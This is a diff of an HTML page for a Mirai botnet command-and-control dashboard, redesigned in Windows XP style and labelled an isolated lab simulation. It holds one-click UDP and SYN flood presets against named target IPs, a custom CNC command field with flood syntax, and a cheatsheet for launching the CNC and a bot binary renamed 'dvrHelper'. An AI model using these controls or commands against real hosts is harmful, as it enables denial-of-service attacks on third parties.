@@ -1,188 +1,299 @@
 <!DOCTYPE html>
-<html lang="th">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Mirai Lab · Soft Command Deck</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <meta name="color-scheme" content="light" />
+  <title>Mirai Lab - Soft Command Deck.exe</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="bg-orb orb-a"></div>
-  <div class="bg-orb orb-b"></div>
-  <div class="bg-orb orb-c"></div>
-  <canvas id="sparkles" aria-hidden="true"></canvas>
+  <div class="desktop" aria-label="Windows XP style Mirai lab dashboard">
+    <aside class="desktop-shortcuts" aria-label="Desktop shortcuts">
+      <button type="button" class="desktop-shortcut" data-focus-window="monitor-window">
+        <span class="pixel-icon icon-monitor" aria-hidden="true"></span>
+        <span>Status.exe</span>
+      </button>
+      <button type="button" class="desktop-shortcut" data-focus-window="command-window">
+        <span class="pixel-icon icon-terminal" aria-hidden="true"></span>
+        <span>CNC.sys</span>
+      </button>
+      <button type="button" class="desktop-shortcut" data-focus-window="console-window">
+        <span class="pixel-icon icon-log" aria-hidden="true"></span>
+        <span>Event.log</span>
+      </button>
+    </aside>
 
-  <div class="shell">
-    <header class="topbar">
-      <div class="brand">
-        <div class="logo-mark" aria-hidden="true">✦</div>
-        <div>
-          <h1>Soft Command Deck</h1>
-          <p class="tagline">Mirai Simulation Lab · educational use only</p>
+    <section class="xp-window app-window" aria-labelledby="app-title">
+      <div class="xp-titlebar app-titlebar">
+        <div class="title-left">
+          <span class="pixel-icon icon-folder" aria-hidden="true"></span>
+          <span id="app-title">Soft Command Deck.exe</span>
+        </div>
+        <div class="window-controls" aria-hidden="true">
+          <span class="win-control win-min"></span>
+          <span class="win-control win-max"></span>
+          <span class="win-control win-close"></span>
         </div>
       </div>
-      <div class="top-actions">
-        <div class="pill" id="pill-cnc"><span class="dot"></span><span>CNC</span></div>
-        <div class="pill" id="pill-bots"><span class="dot soft"></span><span>Bots</span></div>
-        <button type="button" class="btn ghost" id="btn-refresh" title="Refresh">↻ Refresh</button>
-      </div>
-    </header>
 
-    <main class="grid">
-      <!-- Hero stats -->
-      <section class="card hero span-2">
-        <div class="hero-left">
-          <p class="eyebrow">Live fleet</p>
-          <div class="bot-count-wrap">
-            <span class="bot-count" id="bot-count">0</span>
-            <span class="bot-count-label">bots connected</span>
-          </div>
-          <p class="hero-sub" id="hero-sub">Waiting for CNC status…</p>
-          <div class="chip-row" id="dist-chips"></div>
+      <nav class="menu-bar" aria-label="Application menu">
+        <button type="button">File</button>
+        <button type="button">View</button>
+        <button type="button">Tools</button>
+        <button type="button">Help</button>
+      </nav>
+
+      <div class="toolbar">
+        <button type="button" class="xp-button" id="btn-refresh">
+          <span class="pixel-icon icon-refresh" aria-hidden="true"></span>
+          Refresh status
+        </button>
+        <div class="status-chip" id="chip-cnc">
+          <span class="status-led down" id="cnc-led" aria-hidden="true"></span>
+          <span>CNC link: <strong id="cnc-label">checking</strong></span>
         </div>
-        <div class="hero-right">
-          <div class="ring" id="pulse-ring">
-            <div class="ring-core">
-              <span id="peer-count">—</span>
-              <small>TCP peers</small>
+        <div class="status-chip" id="chip-bots">
+          <span class="status-led waiting" id="bot-led" aria-hidden="true"></span>
+          <span>Bot counter: <strong id="bot-label">waiting</strong></span>
+        </div>
+        <div class="toolbar-spacer"></div>
+        <span class="toolbar-readout">CNC 127.0.0.1:23</span>
+      </div>
+
+      <div class="app-body">
+        <main class="desktop-grid">
+          <section class="xp-window monitor-window" id="monitor-window" aria-labelledby="monitor-title">
+            <div class="xp-titlebar">
+              <div class="title-left">
+                <span class="pixel-icon icon-monitor" aria-hidden="true"></span>
+                <span id="monitor-title">Task Manager - Bot Counter</span>
+              </div>
             </div>
-          </div>
-          <ul class="meta-list">
-            <li><span>C2</span><code id="meta-c2">185.10.20.100</code></li>
-            <li><span>Loader</span><code id="meta-loader">185.10.20.200</code></li>
-            <li><span>CNC port</span><code>:23</code></li>
-          </ul>
-        </div>
-      </section>
+            <div class="window-panel">
+              <div class="metric-display" id="bot-count-panel" data-state="waiting">
+                <span class="display-label">BOT_TOTAL</span>
+                <output class="bot-count" id="bot-count">0</output>
+                <span class="display-state" id="bot-state-label">waiting for bots</span>
+              </div>
 
-      <!-- Map / topology -->
-      <section class="card map-card span-2">
-        <div class="card-head">
-          <h2>Lab topology</h2>
-          <span class="badge">VLAN playground</span>
-        </div>
-        <div class="topo" id="topo">
-          <div class="node n-c2" data-tip="CNC / Dashboard">
-            <div class="node-orb c2">C2</div>
-            <span>Attacker C2</span>
-            <code>185.10.20.100</code>
-          </div>
-          <div class="node n-loader" data-tip="Binary host">
-            <div class="node-orb loader">LD</div>
-            <span>Loader</span>
-            <code>185.10.20.200</code>
-          </div>
-          <div class="node n-bot" data-tip="Infected nodes">
-            <div class="node-orb bot">BOT</div>
-            <span>Bot cluster</span>
-            <code>110.164.20.x</code>
-          </div>
-          <div class="node n-sg" data-tip="Lab target SG">
-            <div class="node-orb tgt">SG</div>
-            <span>Target SG</span>
-            <code id="ip-sg">203.0.113.100</code>
-          </div>
-          <div class="node n-kr" data-tip="Lab target KR">
-            <div class="node-orb tgt">KR</div>
-            <span>Target KR</span>
-            <code id="ip-kr">210.89.0.100</code>
-          </div>
-          <svg class="topo-lines" viewBox="0 0 800 220" preserveAspectRatio="none">
-            <path class="link" d="M120,110 C220,40 320,40 400,110" />
-            <path class="link" d="M120,110 C220,180 320,180 400,110" />
-            <path class="link warn" d="M400,110 C500,40 600,40 680,70" />
-            <path class="link warn" d="M400,110 C500,180 600,180 680,150" />
-          </svg>
-        </div>
-      </section>
+              <div class="status-board">
+                <div class="status-row">
+                  <span><span class="status-led down" id="cnc-led-secondary" aria-hidden="true"></span>CNC online</span>
+                  <strong id="cnc-status-text">checking</strong>
+                </div>
+                <div class="status-row">
+                  <span><span class="status-led waiting" id="bot-led-secondary" aria-hidden="true"></span>Bot count state</span>
+                  <strong id="bot-status-text">waiting</strong>
+                </div>
+                <div class="status-row">
+                  <span>TCP peers</span>
+                  <strong id="peer-count">-</strong>
+                </div>
+                <div class="status-row">
+                  <span>Last refresh</span>
+                  <strong id="last-refresh">-</strong>
+                </div>
+              </div>
 
-      <!-- Quick actions -->
-      <section class="card actions">
-        <div class="card-head">
-          <h2>One-tap tools</h2>
-          <span class="badge pink">no more telnet typing</span>
-        </div>
-        <div class="action-grid">
-          <button type="button" class="action" data-cmd="botcount">
-            <span class="a-icon">◈</span>
-            <span class="a-title">Bot count</span>
-            <span class="a-desc">Query live distribution</span>
-          </button>
-          <button type="button" class="action accent" data-attack="sg">
-            <span class="a-icon">✧</span>
-            <span class="a-title">Pulse · Singapore</span>
-            <span class="a-desc">udp → lab SG :80 · 30s</span>
-          </button>
-          <button type="button" class="action accent2" data-attack="kr">
-            <span class="a-icon">◇</span>
-            <span class="a-title">Pulse · South Korea</span>
-            <span class="a-desc">udp → lab KR :80 · 30s</span>
-          </button>
-          <button type="button" class="action soft" id="btn-status">
-            <span class="a-icon">◎</span>
-            <span class="a-title">Full status</span>
-            <span class="a-desc">CNC + peers + bots</span>
-          </button>
-        </div>
+              <div class="group-box">
+                <span class="group-label">Distribution</span>
+                <table class="xp-table" aria-label="Bot distribution">
+                  <thead>
+                    <tr>
+                      <th>Source tag</th>
+                      <th>Count</th>
+                    </tr>
+                  </thead>
+                  <tbody id="dist-rows">
+                    <tr><td colspan="2">Waiting for status poll</td></tr>
+                  </tbody>
+                </table>
+              </div>
 
-        <div class="custom-cmd">
-          <label for="cmd-input">Custom CNC command</label>
-          <div class="cmd-row">
-            <input id="cmd-input" type="text" placeholder="e.g. botcount  or  udp 203.0.113.100 20 dport=80" autocomplete="off" />
-            <button type="button" class="btn primary" id="btn-send">Send</button>
-          </div>
-          <p class="hint">Lab only · same grammar as admin@botnet#</p>
-        </div>
-      </section>
+              <div class="last-state">
+                <div>
+                  <span class="mini-label">Last command</span>
+                  <code id="last-command">none</code>
+                </div>
+                <div>
+                  <span class="mini-label">Last error</span>
+                  <code id="last-error">none</code>
+                </div>
+              </div>
+            </div>
+          </section>
 
-      <!-- Logs -->
-      <section class="card logs">
-        <div class="card-head">
-          <h2>Live console</h2>
-          <button type="button" class="btn tiny ghost" id="btn-clear-log">Clear view</button>
-        </div>
-        <div class="console" id="console" aria-live="polite"></div>
-      </section>
+          <section class="xp-window command-window" id="command-window" aria-labelledby="command-title">
+            <div class="xp-titlebar">
+              <div class="title-left">
+                <span class="pixel-icon icon-terminal" aria-hidden="true"></span>
+                <span id="command-title">C:\Mirai\CNC.sys</span>
+              </div>
+            </div>
+            <div class="window-panel">
+              <fieldset class="xp-fieldset">
+                <legend>Information</legend>
+                <div class="button-grid info-grid" role="group" aria-label="Status commands">
+                  <button type="button" class="xp-button command-button" data-cmd="botcount">
+                    <span class="pixel-icon icon-bot" aria-hidden="true"></span>
+                    Bot Count
+                  </button>
+                  <button type="button" class="xp-button command-button" data-action="refresh">
+                    <span class="pixel-icon icon-refresh" aria-hidden="true"></span>
+                    Full Status
+                  </button>
+                </div>
+              </fieldset>
 
-      <!-- Cheatsheet -->
-      <section class="card sheet span-2">
-        <div class="card-head">
-          <h2>Operator cheatsheet</h2>
-        </div>
-        <div class="sheet-grid">
-          <div>
-            <h3>On C2</h3>
-            <pre>cd mirai/release
-nohup ./cnc > cnc.log 2>&1 &
+              <fieldset class="xp-fieldset">
+                <legend>Lab UDP presets</legend>
+                <div class="button-grid attack-grid" role="group" aria-label="UDP lab attack presets">
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="sg" data-method="udp" data-duration="10" data-dport="80">UDP SG 10s</button>
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="sg" data-method="udp" data-duration="30" data-dport="80">UDP SG 30s</button>
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="sg" data-method="udp" data-duration="60" data-dport="80">UDP SG 60s</button>
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="kr" data-method="udp" data-duration="10" data-dport="80">UDP KR 10s</button>
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="kr" data-method="udp" data-duration="30" data-dport="80">UDP KR 30s</button>
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="kr" data-method="udp" data-duration="60" data-dport="80">UDP KR 60s</button>
+                </div>
+              </fieldset>
+
+              <fieldset class="xp-fieldset">
+                <legend>Lab SYN presets</legend>
+                <div class="button-grid attack-grid" role="group" aria-label="SYN lab attack presets">
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="sg" data-method="syn" data-duration="20" data-dport="80">SYN SG 20s</button>
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="sg" data-method="syn" data-duration="60" data-dport="80">SYN SG 60s</button>
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="kr" data-method="syn" data-duration="20" data-dport="80">SYN KR 20s</button>
+                  <button type="button" class="xp-button command-button attack-button" data-attack-target="kr" data-method="syn" data-duration="60" data-dport="80">SYN KR 60s</button>
+                </div>
+              </fieldset>
+
+              <form class="custom-command" id="command-form">
+                <label for="cmd-input">Custom CNC command</label>
+                <div class="command-row">
+                  <input class="xp-input" id="cmd-input" type="text" autocomplete="off" spellcheck="false" placeholder="botcount  or  udp 203.0.113.100 30 dport=80" />
+                  <button type="submit" class="xp-button run-button" id="btn-send">Run command</button>
+                </div>
+              </form>
+            </div>
+          </section>
+
+          <section class="xp-window console-window" id="console-window" aria-labelledby="console-title">
+            <div class="xp-titlebar">
+              <div class="title-left">
+                <span class="pixel-icon icon-log" aria-hidden="true"></span>
+                <span id="console-title">HyperTerminal - admin@botnet#</span>
+              </div>
+              <button type="button" class="titlebar-button" id="btn-clear-log">Clear</button>
+            </div>
+            <div class="terminal-toolbar">
+              <span>Connected via Flask API</span>
+              <span id="terminal-status">polling /api/status</span>
+            </div>
+            <div class="terminal" id="console" aria-live="polite" aria-label="Live CNC and dashboard logs">
+              <div class="line sys">[SYS] waiting for dashboard status poll</div>
+            </div>
+          </section>
+
+          <section class="xp-window topology-window" id="topology-window" aria-labelledby="topology-title">
+            <div class="xp-titlebar">
+              <div class="title-left">
+                <span class="pixel-icon icon-network" aria-hidden="true"></span>
+                <span id="topology-title">Network Neighborhood</span>
+              </div>
+            </div>
+            <div class="window-panel">
+              <div class="network-map" aria-label="Lab topology">
+                <div class="network-node node-c2" id="node-c2">
+                  <span class="pixel-icon icon-server" aria-hidden="true"></span>
+                  <strong>C2 / CNC</strong>
+                  <code id="ip-c2">185.10.20.100</code>
+                </div>
+                <div class="network-node node-loader" id="node-loader">
+                  <span class="pixel-icon icon-folder" aria-hidden="true"></span>
+                  <strong>Loader</strong>
+                  <code id="ip-loader">185.10.20.200</code>
+                </div>
+                <div class="network-node node-bots" id="node-bots">
+                  <span class="pixel-icon icon-bot" aria-hidden="true"></span>
+                  <strong>Bots</strong>
+                  <code>110.164.20.0/24</code>
+                  <code>125.20.30.0/24</code>
+                </div>
+                <div class="network-node node-sg" id="node-sg">
+                  <span class="pixel-icon icon-target" aria-hidden="true"></span>
+                  <strong>Target SG</strong>
+                  <code id="ip-sg">203.0.113.100</code>
+                </div>
+                <div class="network-node node-kr" id="node-kr">
+                  <span class="pixel-icon icon-target" aria-hidden="true"></span>
+                  <strong>Target KR</strong>
+                  <code id="ip-kr">210.89.0.100</code>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <section class="xp-window cheatsheet-window" id="cheatsheet-window" aria-labelledby="cheatsheet-title">
+            <div class="xp-titlebar">
+              <div class="title-left">
+                <span class="pixel-icon icon-doc" aria-hidden="true"></span>
+                <span id="cheatsheet-title">Event Viewer - lab-cheatsheet.txt</span>
+              </div>
+            </div>
+            <div class="window-panel cheatsheet-grid">
+              <article class="cheat-card">
+                <div class="cheat-head">
+                  <strong>C2 session</strong>
+                  <button type="button" class="xp-button tiny-button" data-copy-target="cheat-c2">Copy</button>
+                </div>
+                <pre id="cheat-c2">cd ~/Mirai-Botnet-Simulation-Lab/mirai/release
+screen -S cnc ./cnc
+screen -r cnc
 ss -lntp | grep :23</pre>
-          </div>
-          <div>
-            <h3>On bot</h3>
-            <pre>cp mirai.x86 dvrHelper
+              </article>
+              <article class="cheat-card">
+                <div class="cheat-head">
+                  <strong>Bot node</strong>
+                  <button type="button" class="xp-button tiny-button" data-copy-target="cheat-bot">Copy</button>
+                </div>
+                <pre id="cheat-bot">cp mirai.x86 dvrHelper
 ./dvrHelper
-# or ./mirai.dbg for logs</pre>
-          </div>
-          <div>
-            <h3>This dashboard</h3>
-            <pre>cd dashboard/backend
-pip install -r requirements.txt
-python3 app.py
-# open :8080</pre>
-          </div>
-        </div>
-      </section>
-    </main>
+# debug build:
+./mirai.dbg</pre>
+              </article>
+              <article class="cheat-card">
+                <div class="cheat-head">
+                  <strong>Dashboard</strong>
+                  <button type="button" class="xp-button tiny-button" data-copy-target="cheat-dashboard">Copy</button>
+                </div>
+                <pre id="cheat-dashboard">cd dashboard
+./start.sh
+# open http://127.0.0.1:8080</pre>
+              </article>
+            </div>
+          </section>
+        </main>
+      </div>
 
-    <footer class="foot">
-      <span>Soft Command Deck · isolated lab demonstration</span>
-      <span id="clock"></span>
-    </footer>
+      <div class="status-bar">
+        <span id="status-message">Ready</span>
+        <span class="status-bar-slot">Lab profile: Proxmox isolated VLAN</span>
+      </div>
+    </section>
   </div>
 
-  <div class="toast-wrap" id="toasts"></div>
+  <footer class="taskbar" aria-label="Lab safety footer">
+    <button type="button" class="start-button">
+      <span class="pixel-icon icon-start" aria-hidden="true"></span>
+      Start
+    </button>
+    <div class="taskbar-button">Soft Command Deck.exe</div>
+    <div class="taskbar-warning">Isolated lab simulation, unauthorized real-world use illegal</div>
+    <time class="taskbar-clock" id="clock"></time>
+  </footer>
+
+  <div class="toast-wrap" id="toasts" aria-live="polite"></div>
   <script src="app.js"></script>
 </body>
 </html>
